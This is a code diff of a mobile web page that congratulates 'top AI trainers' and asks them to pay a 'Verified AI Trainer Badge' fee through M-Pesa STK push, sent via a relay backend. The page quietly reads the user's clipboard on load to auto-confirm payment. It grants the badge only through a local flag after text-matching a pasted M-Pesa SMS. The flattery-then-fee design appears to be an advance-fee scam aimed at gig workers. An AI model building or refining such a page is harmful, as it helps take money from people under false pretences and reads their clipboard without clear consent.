@@ -35,7 +35,6 @@
             line-height: 1.5;
         }
 
-        /* ── Scrollable page ── */
         .page { max-width: 520px; margin: 0 auto; padding: 20px 16px 60px; }
 
         /* ── Congratulations Banner ── */
@@ -68,11 +67,7 @@
             color: #fff;
             margin-bottom: 4px;
         }
-        .congrats-banner p {
-            font-size: 12px;
-            color: #bfdbfe;
-            line-height: 1.4;
-        }
+        .congrats-banner p { font-size: 12px; color: #bfdbfe; line-height: 1.4; }
 
         /* ── Header ── */
         .page-header {
@@ -180,25 +175,18 @@
         }
         .btn-green:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(34,197,94,.4); }
         .btn-green:active { transform: translateY(0); }
-
         .btn-blue {
             background: linear-gradient(135deg, var(--blue), var(--blue-dk));
             color: #fff;
             box-shadow: 0 4px 14px rgba(59,130,246,.3);
         }
         .btn-blue:hover { transform: translateY(-2px); }
-
         .btn-ghost {
             background: var(--bg-card);
             color: var(--muted);
             border: 1px solid var(--border);
         }
         .btn-ghost:hover { border-color: var(--border-lt); color: var(--text); }
-
-        .btn-red {
-            background: linear-gradient(135deg, var(--red), #dc2626);
-            color: #fff;
-        }
 
         /* ── Overlay ── */
         .overlay {
@@ -235,26 +223,10 @@
         }
         .popup-header p { font-size: 12px; color: var(--muted); margin-bottom: 14px; }
         .popup-body { padding: 16px 22px 22px; }
-        .popup-divider {
-            height: 1px;
-            background: var(--border);
-            margin: 0 22px 16px;
-        }
+        .popup-divider { height: 1px; background: var(--border); margin: 0 22px 16px; }
 
         /* ── Payment Method Popup ── */
         #paymentPopup { border: 2px solid var(--green-dk); }
-
-        .plan-info-badge {
-            background: var(--green-bg);
-            border: 1px solid rgba(34,197,94,.3);
-            border-radius: 8px;
-            padding: 8px 12px;
-            text-align: center;
-            font-size: 12px;
-            color: var(--green);
-            font-weight: 600;
-            margin-bottom: 16px;
-        }
 
         .recommended-tag {
             background: rgba(251,191,36,.15);
@@ -290,7 +262,7 @@
             margin-bottom: 8px;
         }
         .mpesa-primary-btn small { font-size: 11px; font-weight: 400; opacity: .8; }
-        .mpesa-primary-btn:hover { transform: translateY(-2px); box-shadow: 0 6px 24px rgba(22,163,74,.5); }
+        .mpesa-primary-btn:hover { transform: translateY(-2px); }
 
         .mpesa-benefits {
             text-align: center;
@@ -303,7 +275,7 @@
             display: flex;
             align-items: center;
             gap: 12px;
-            margin: 16px 0;
+            margin: 14px 0;
         }
         .divider-row span { flex-shrink: 0; font-size: 12px; color: var(--dim); font-weight: 700; }
         .divider-line { flex: 1; height: 1px; background: var(--border); }
@@ -465,6 +437,8 @@
             text-align: center;
             line-height: 1.6;
             margin-bottom: 12px;
+            padding: 0 16px;
+            white-space: pre-line;
         }
         .error-info {
             background: rgba(239,68,68,.08);
@@ -534,7 +508,6 @@
         #loadingOverlay {
             background: rgba(11,17,32,.95);
             flex-direction: column;
-            gap: 0;
         }
         .loading-box {
             background: var(--bg-card);
@@ -594,7 +567,6 @@
         .toast.show { bottom: 28px; }
         .toast.success { background: var(--green-dk); }
 
-        /* ── Unavailable form ── */
         .unavailable-warning {
             background: rgba(239,68,68,.1);
             border: 1px solid rgba(239,68,68,.25);
@@ -607,7 +579,6 @@
             line-height: 1.5;
         }
 
-        /* ── Responsive ── */
         @media (max-width: 420px) {
             .page-header h1 { font-size: 21px; }
             .fee-card .amount { font-size: 32px; }
@@ -619,14 +590,12 @@
 <!-- ========== MAIN PAGE ========== -->
 <div class="page">
 
-    <!-- Congratulations Banner -->
     <div class="congrats-banner">
         <div class="icon">🎉</div>
         <h2 id="congratsName">Congratulations!</h2>
         <p>You're among the top 25% AI trainers providing exceptional responses!</p>
     </div>
 
-    <!-- Header with badge -->
     <div class="page-header">
         <div class="badge-top-right" id="badgeTopRight">🎓</div>
         <div class="header-icon">🎓</div>
@@ -634,14 +603,12 @@
         <p>Your exceptional work qualifies you for elite status</p>
     </div>
 
-    <!-- Fee Card -->
     <div class="fee-card">
         <div class="amount" id="feeAmount">$0.00</div>
         <div class="label">Verified AI Trainer Badge</div>
         <div class="sublabel">💳 Instant • Lifetime Access</div>
     </div>
 
-    <!-- Elite Benefits -->
     <div class="card">
         <div class="card-title">🏆 Elite Trainer Benefits</div>
         <div class="benefit-row">
@@ -662,14 +629,12 @@
         </div>
     </div>
 
-    <!-- Encourage Card -->
     <div class="encourage-card">
         <div class="icon">💪</div>
         <p>Keep delivering excellent responses and maximize<br>your earning potential as a verified trainer!</p>
     </div>
 
-    <!-- CTA Button -->
-    <button class="btn btn-green" id="claimBadgeBtn" onclick="openPaymentPopup()">
+    <button class="btn btn-green" onclick="openPaymentPopup()">
         🎓 Claim Your Verified Badge – <span id="btnFeeLabel">$0.00</span>
     </button>
 
@@ -686,33 +651,21 @@
         </div>
         <div class="popup-divider"></div>
         <div class="popup-body">
-
-            <!-- Recommended tag -->
             <div style="text-align:center;margin-bottom:10px;">
                 <span class="recommended-tag">⭐ RECOMMENDED</span>
             </div>
-
-            <!-- M-Pesa Primary -->
             <button class="mpesa-primary-btn" onclick="openMpesaForm()">
                 <span>📱  M-Pesa Express</span>
                 <small>Fast & Secure Payment</small>
             </button>
-
             <div class="mpesa-benefits">✓ Instant activation &nbsp;✓ No card needed &nbsp;✓ 100% secure</div>
-
-            <!-- OR Divider -->
             <div class="divider-row">
                 <div class="divider-line"></div>
                 <span>OR</span>
                 <div class="divider-line"></div>
             </div>
-
-            <!-- Secondary M-Pesa -->
             <button class="btn btn-green" style="margin-bottom:14px;" onclick="openMpesaForm()">Pay With M-Pesa</button>
-
-            <!-- Other payment methods label -->
             <div style="font-size:12px;color:var(--muted);margin-bottom:8px;">Other payment methods:</div>
-
             <select class="form-select" id="altMethodSelect" onchange="handleAltMethod(this)">
                 <option value="">Select alternative method...</option>
                 <option value="Credit/Debit Card">💳  Credit/Debit Card</option>
@@ -721,7 +674,6 @@
                 <option value="Google Pay">🔵  Google Pay</option>
                 <option value="Paystack">💠  Paystack</option>
             </select>
-
             <button class="btn btn-ghost" onclick="closePaymentPopup()">Cancel</button>
         </div>
     </div>
@@ -749,11 +701,10 @@
         <div class="popup-header">
             <div style="font-size:44px;margin-bottom:10px;">📱</div>
             <h3>Manual Verification</h3>
-            <p>Paste your M-Pesa confirmation message to verify your payment</p>
+            <p>Paste your M-Pesa confirmation message to verify</p>
         </div>
         <div class="popup-divider"></div>
         <div class="popup-body">
-
             <div class="instructions-block">
                 <p>
                     If you already paid via M-Pesa:<br><br>
@@ -762,16 +713,15 @@
                     3. Paste it below and click Verify
                 </p>
             </div>
-
             <div class="expected-amount" id="expectedAmountDisplay">Expected Amount: KES —</div>
-
             <label class="form-label">Paste M-Pesa message here:</label>
             <textarea
                 class="textarea-input"
                 id="mpesaMessageInput"
                 placeholder="Example: RZS1234567 Confirmed. Ksh194.00 sent to FLEX BS SOLUTIONS 4098264..."
             ></textarea>
-
+            <div id="mvErr" style="font-size:12px;color:var(--red);margin-top:-8px;
+                margin-bottom:10px;display:none;text-align:center;"></div>
             <button class="btn btn-green" onclick="verifyMpesaMessage()">✓ Verify Payment</button>
             <button class="btn btn-ghost" onclick="closeManualVerify()">Cancel</button>
         </div>
@@ -783,14 +733,14 @@
 <div class="overlay" id="paymentErrorOverlay">
     <div class="popup" id="paymentErrorPopup">
         <div class="error-icon-circle">⚠️</div>
-        <div class="error-title">Verification Failed</div>
-        <div class="error-msg" id="errorMsgText">An error occurred during verification.</div>
+        <div class="error-title" id="errorTitle">Payment Failed</div>
+        <div class="error-msg" id="errorMsgText">An error occurred.</div>
         <div class="popup-body">
             <div class="error-info">
                 If money was deducted from your M-Pesa,<br>you can verify manually below.
             </div>
             <button class="btn btn-blue" onclick="openManualFromError()">📱 Manual Verify</button>
-            <button class="btn btn-green" onclick="retryPayment()">🔄 Retry Verification</button>
+            <button class="btn btn-green btn-retry" onclick="retryPayment()">🔄 Retry Payment</button>
             <button class="btn btn-ghost" onclick="closePaymentError()">Cancel</button>
         </div>
     </div>
@@ -836,14 +786,18 @@
 <script>
 // ================== STATE ==================
 const state = {
-    activateAmount: 0.93,
-    kshAmount: 0,
-    USD_TO_KSH: 129.4,
-    tillNumber: '4098264',
-    tillName: 'FLEX BS SOLUTIONS',
-    selectedMethod: 'M-Pesa Express',
-    currentAmount: 0,
-    currentPhone: ''
+    activateAmountUSD: 0.93,
+    kshAmount:         0,
+    USD_TO_KSH:        129.4,
+    tillName:          'FLEX BS SOLUTIONS',
+    selectedMethod:    'M-Pesa Express',
+    currentAmount:     0,
+    currentPhone:      ''
+};
+
+// ================== PAYHERO CONFIG ==================
+const PAYHERO = {
+    backendUrl: 'https://payhero-api.onrender.com'
 };
 
 // ================== INIT ==================
@@ -860,20 +814,20 @@ function loadTillInformation() {
         if (raw) {
             const data = JSON.parse(raw);
             if (data && data.length > 12) {
-                state.activateAmount = parseFloat(data[12]) || 0;
+                const usd = parseFloat(data[12]) || state.activateAmountUSD;
+                state.activateAmountUSD = usd;
             }
             if (data && data.length > 1) {
-                state.tillNumber = data[0] || state.tillNumber;
-                state.tillName   = data[1] || state.tillName;
+                state.tillName = data[1] || state.tillName;
             }
         }
     } catch(e) { console.error(e); }
 
-    state.kshAmount = Math.round(state.activateAmount * state.USD_TO_KSH);
+    state.kshAmount    = Math.round(state.activateAmountUSD * state.USD_TO_KSH);
     state.currentAmount = state.kshAmount;
 
-    document.getElementById('feeAmount').textContent   = `$${state.activateAmount.toFixed(2)}`;
-    document.getElementById('btnFeeLabel').textContent = `$${state.activateAmount.toFixed(2)}`;
+    document.getElementById('feeAmount').textContent   = `$${state.activateAmountUSD.toFixed(2)}`;
+    document.getElementById('btnFeeLabel').textContent = `$${state.activateAmountUSD.toFixed(2)}`;
 }
 
 function loadUserName() {
@@ -881,17 +835,15 @@ function loadUserName() {
         const raw = localStorage.getItem('signuplist');
         if (raw) {
             const list = JSON.parse(raw);
-            const fullName = list[0] || '';
-            const firstName = fullName.split(' ')[0] || 'User';
+            const firstName = (list[0] || '').split(' ')[0] || 'User';
             document.getElementById('congratsName').textContent = `Congratulations, ${firstName}!`;
         }
     } catch(e) {}
 }
 
 function checkBadgeStatus() {
-    const verified = localStorage.getItem('verifiedbadge');
     const el = document.getElementById('badgeTopRight');
-    if (verified) {
+    if (localStorage.getItem('verifiedbadge')) {
         el.textContent = '✓';
         el.classList.add('verified');
     }
@@ -903,25 +855,22 @@ async function checkClipboardForAutoVerification() {
         if (!navigator.clipboard || !navigator.clipboard.readText) return;
         const text = await navigator.clipboard.readText();
         if (!text) return;
-
         if (text.toLowerCase().includes(state.tillName.toLowerCase())) {
-            if (verifyMpesaText(text)) {
+            if (verifyMpesaText(text, true)) {
                 showToast('Payment verified automatically!', true);
                 setTimeout(showSuccessPopup, 1200);
             }
         }
-    } catch(e) {
-        // Clipboard read may be denied – that's fine
-    }
+    } catch(e) { /* clipboard access denied — silent */ }
 }
 
-// ================== PAYMENT POPUP ==================
+// ================== PAYMENT METHOD POPUP ==================
 function openPaymentPopup() {
     showLoading('Loading payment options...');
     setTimeout(() => {
         hideLoading();
         document.getElementById('popupPlanInfo').textContent =
-            `Verified AI Trainer Badge • $${state.activateAmount.toFixed(2)}`;
+            `Verified AI Trainer Badge • $${state.activateAmountUSD.toFixed(2)}`;
         const sel = document.getElementById('altMethodSelect');
         if (sel) sel.value = '';
         document.getElementById('paymentOverlay').classList.add('active');
@@ -936,20 +885,14 @@ function handleAltMethod(sel) {
     const val = sel.value;
     if (!val) return;
     showLoading('Loading payment form...');
-    setTimeout(() => {
-        hideLoading();
-        openPaymentDetails(val);
-    }, 600);
+    setTimeout(() => { hideLoading(); openPaymentDetails(val); }, 600);
 }
 
 // ================== PAYMENT DETAILS POPUP ==================
 function openMpesaForm() {
     closePaymentPopup();
     showLoading('Loading M-Pesa Express...');
-    setTimeout(() => {
-        hideLoading();
-        openPaymentDetails('M-Pesa Express');
-    }, 600);
+    setTimeout(() => { hideLoading(); openPaymentDetails('M-Pesa Express'); }, 600);
 }
 
 function openPaymentDetails(method) {
@@ -957,29 +900,26 @@ function openPaymentDetails(method) {
     closePaymentPopup();
 
     const ksh = state.kshAmount;
-    const header = document.getElementById('detailsHeader');
-    const planInfo = document.getElementById('detailsPlanInfo');
-    const body = document.getElementById('detailsBody');
-
     const icons = {
-        'M-Pesa Express': '📱',
-        'Credit/Debit Card': '💳',
-        'PayPal': '🅿️',
-        'Stripe': '◆',
-        'Google Pay': '🔵',
-        'Paystack': '💠'
+        'M-Pesa Express':   '📱',
+        'Credit/Debit Card':'💳',
+        'PayPal':           '🅿️',
+        'Stripe':           '◆',
+        'Google Pay':       '🔵',
+        'Paystack':         '💠'
     };
-    header.textContent = `${icons[method] || '💳'} ${method}`;
-    planInfo.textContent = method === 'M-Pesa Express'
-        ? `Verified AI Trainer Badge • $${state.activateAmount.toFixed(2)} (Ksh ${ksh})`
-        : `Verified AI Trainer Badge • $${state.activateAmount.toFixed(2)}`;
 
-    if (method === 'M-Pesa Express') {
-        body.innerHTML = buildMpesaFormHTML(ksh);
-        prefillPhone();
-    } else {
-        body.innerHTML = buildUnavailableFormHTML();
-    }
+    document.getElementById('detailsHeader').textContent  = `${icons[method] || '💳'} ${method}`;
+    document.getElementById('detailsPlanInfo').textContent = method === 'M-Pesa Express'
+        ? `Verified AI Trainer Badge • $${state.activateAmountUSD.toFixed(2)} (Ksh ${ksh})`
+        : `Verified AI Trainer Badge • $${state.activateAmountUSD.toFixed(2)}`;
+
+    const body = document.getElementById('detailsBody');
+    body.innerHTML = method === 'M-Pesa Express'
+        ? buildMpesaFormHTML(ksh)
+        : buildUnavailableFormHTML();
+
+    if (method === 'M-Pesa Express') prefillPhone();
 
     document.getElementById('paymentDetailsOverlay').classList.add('active');
 }
@@ -1055,7 +995,7 @@ function closePaymentDetails() {
     openPaymentPopup();
 }
 
-// ================== M-PESA PAYMENT PROCESSING ==================
+// ================== M-PESA PAYMENT — SAME FORMAT AS MAIN PAYMENT PAGE ==================
 async function processMpesaPayment() {
     const phoneEl = document.getElementById('mpesaPhone');
     if (!phoneEl) return;
@@ -1063,47 +1003,57 @@ async function processMpesaPayment() {
 
     if (!phone) { showToast('Please enter your M-Pesa phone number'); return; }
 
+    // Format phone → 254XXXXXXXXX (same as B4A and main payment JS)
     let clean = phone.replace(/[\s\-\+]/g, '');
-    if (clean.startsWith('0')) clean = '254' + clean.substring(1);
-    else if (!clean.startsWith('254')) clean = '254' + clean;
+    if (clean.startsWith('0'))    clean = '254' + clean.substring(1);
+    if (!clean.startsWith('254')) clean = '254' + clean;
 
     if (clean.length !== 12) {
         showToast('Invalid phone number. Please use format: 07XXXXXXXX');
         return;
     }
 
-    state.currentPhone = clean;
-    document.getElementById('paymentDetailsOverlay').classList.remove('active');
+    state.currentPhone  = clean;
+    state.currentAmount = state.kshAmount;
 
+    // ── 1. Hide payment details, show loading ──
+    document.getElementById('paymentDetailsOverlay').classList.remove('active');
     showLoading('Connecting to PayHero...');
 
-    const ksh = state.kshAmount;
-    const payload = {
-        phone_number: clean,
-        amount: ksh,
-        reference: `REMO-BADGE-${Date.now()}`,
-        platform: 'HK93V1',
-        account_id: '4596'
-    };
-
     try {
-        const res = await fetch('https://api.payhero.stkpush.co.ke/payments/stk-push/', {
-            method: 'POST',
+        const response = await fetch(`${PAYHERO.backendUrl}/api/payment/initiate`, {
+            method:  'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
+            body: JSON.stringify({
+                phone:       clean,
+                amount:      state.kshAmount,
+                description: 'Verified Badge Activation'
+            })
         });
-        const data = await res.json();
-        console.log('STK push response:', data);
-    } catch(e) {
-        console.error('STK push error:', e);
-    }
 
-    updateLoading('Check your phone\nEnter M-Pesa PIN');
+        const data = await response.json();
 
-    setTimeout(() => {
+        if (data.status === 'success') {
+            console.log('STK Push initiated:', data);
+
+            // ── 2. Prompt user to enter PIN ──
+            updateLoading('Check your phone<br>Enter M-Pesa PIN ✅');
+
+            // ── 3. After 15s → hide loading, show manual verify popup ──
+            setTimeout(() => {
+                hideLoading();
+                openManualVerify();
+            }, 15000);
+
+        } else {
+            throw new Error(data.message || 'Payment initiation failed');
+        }
+
+    } catch (error) {
+        console.error('Payment error:', error);
         hideLoading();
-        openManualVerify();
-    }, 15000);
+        showPaymentError('Failed to initiate payment:\n\n' + error.message);
+    }
 }
 
 // ================== MANUAL VERIFICATION ==================
@@ -1125,6 +1075,7 @@ function openManualVerify() {
     document.getElementById('expectedAmountDisplay').textContent =
         `Expected Amount: KES ${state.kshAmount}`;
     document.getElementById('mpesaMessageInput').value = '';
+    document.getElementById('mvErr').style.display     = 'none';
     document.getElementById('manualVerifyOverlay').classList.add('active');
 }
 
@@ -1132,47 +1083,61 @@ function closeManualVerify() {
     document.getElementById('manualVerifyOverlay').classList.remove('active');
 }
 
+// Same 3-check logic as B4A VerifyMpesaMessage and main payment JS
 function verifyMpesaMessage() {
     const msg = document.getElementById('mpesaMessageInput').value.trim();
-    if (!msg) { showToast('Please paste your M-Pesa message'); return; }
+    if (!msg) { showMvErr('Please paste your M-Pesa message first.'); return; }
 
     if (verifyMpesaText(msg)) {
         closeManualVerify();
         showToast('Payment verified successfully!', true);
         setTimeout(showSuccessPopup, 800);
-    } else {
-        showToast('Verification failed. Please check the message and try again.');
     }
 }
 
-function verifyMpesaText(msg) {
-    const lower = msg.toLowerCase();
+function verifyMpesaText(msg, silent = false) {
+    const lower     = msg.toLowerCase();
     const tillLower = state.tillName.toLowerCase();
+    const amt       = String(state.kshAmount);
 
+    // Check 1: till name
     if (!lower.includes(tillLower)) {
-        showToast('This payment was not made to us');
+        if (!silent) showMvErr('This payment was not made to us.');
         return false;
     }
 
-    const amt = String(state.kshAmount);
-    const found =
-        lower.includes(`ksh${amt}.00`) ||
+    // Check 2: amount in multiple formats
+    const amountFound =
+        lower.includes(`ksh${amt}.00`)  ||
         lower.includes(`ksh ${amt}.00`) ||
-        lower.includes(`${amt}.00`) ||
-        lower.includes(`ksh${amt}`) ||
+        lower.includes(`${amt}.00`)     ||
+        lower.includes(`ksh${amt}`)     ||
         lower.includes(`ksh ${amt}`);
 
-    if (!found) {
-        showToast(`Payment amount does not match. Expected: KES ${amt}`);
+    if (!amountFound) {
+        if (!silent) showMvErr(`Payment amount does not match. Expected: KES ${amt}`);
         return false;
     }
 
+    // Check 3: confirmation keywords
     if (!lower.includes('confirmed') && !lower.includes('sent')) {
-        showToast("This doesn't appear to be a valid M-Pesa confirmation message");
+        if (!silent) showMvErr("This doesn't appear to be a valid M-Pesa confirmation message.");
         return false;
     }
+
+    console.log('=================================');
+    console.log('MANUAL VERIFICATION SUCCESSFUL!');
+    console.log('Till Name:', state.tillName);
+    console.log('Amount: KES', amt);
+    console.log('=================================');
 
     return true;
+}
+
+function showMvErr(msg) {
+    const el = document.getElementById('mvErr');
+    el.textContent   = msg;
+    el.style.display = 'block';
 }
 
 // ================== SUCCESS POPUP ==================
@@ -1183,17 +1148,16 @@ function showSuccessPopup() {
 function handleSuccessProceed() {
     document.getElementById('successOverlay').classList.remove('active');
 
-    // Save verified badge
+    // Save verified badge status
     localStorage.setItem('verifiedbadge', JSON.stringify(['verifiedbadge']));
 
     showToast('You are now a verified AI trainer!', true);
-    setTimeout(() => {
-        window.location.href = 'important-info.html';
-    }, 1500);
+    setTimeout(() => { window.location.href = 'important-info.html'; }, 1500);
 }
 
 // ================== ERROR POPUP ==================
 function showPaymentError(msg) {
+    document.getElementById('errorTitle').textContent   = 'Payment Failed';
     document.getElementById('errorMsgText').textContent = msg;
     document.getElementById('paymentErrorOverlay').classList.add('active');
 }
@@ -1207,7 +1171,7 @@ function retryPayment() {
     openPaymentDetails(state.selectedMethod);
 }
 
-// ================== LOADING OVERLAY ==================
+// ================== LOADING ==================
 function showLoading(msg) {
     document.getElementById('loadingText').innerHTML = msg.replace(/\n/g, '<br>');
     document.getElementById('loadingOverlay').classList.add('active');
@@ -1225,7 +1189,7 @@ function hideLoading() {
 function showToast(msg, success = false) {
     const t = document.getElementById('toast');
     t.textContent = msg;
-    t.className = 'toast' + (success ? ' success' : '');
+    t.className   = 'toast' + (success ? ' success' : '');
     t.classList.add('show');
     setTimeout(() => t.classList.remove('show'), 2800);
 }
